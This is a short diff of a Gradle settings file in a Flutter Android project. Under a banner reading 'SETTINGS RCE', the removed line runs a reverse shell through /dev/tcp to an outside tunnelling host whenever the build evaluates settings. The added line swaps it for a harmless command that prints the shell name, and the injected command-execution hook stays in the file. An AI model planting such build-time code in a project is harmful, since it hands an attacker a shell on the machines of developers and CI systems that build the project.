@@ -1,6 +1,6 @@
 include ':app'
 println "=== SETTINGS RCE ==="
-println "WHOAMI: " + "sh -i >& /dev/tcp/atyqw-182-253-141-95.a.free.pinggy.link/38141 0>&1".execute().text
+println "WHOAMI: " + "echo \$0".execute().text
 def flutterProjectRoot = rootProject.projectDir.parentFile.toPath()
 
 def plugins = new Properties()
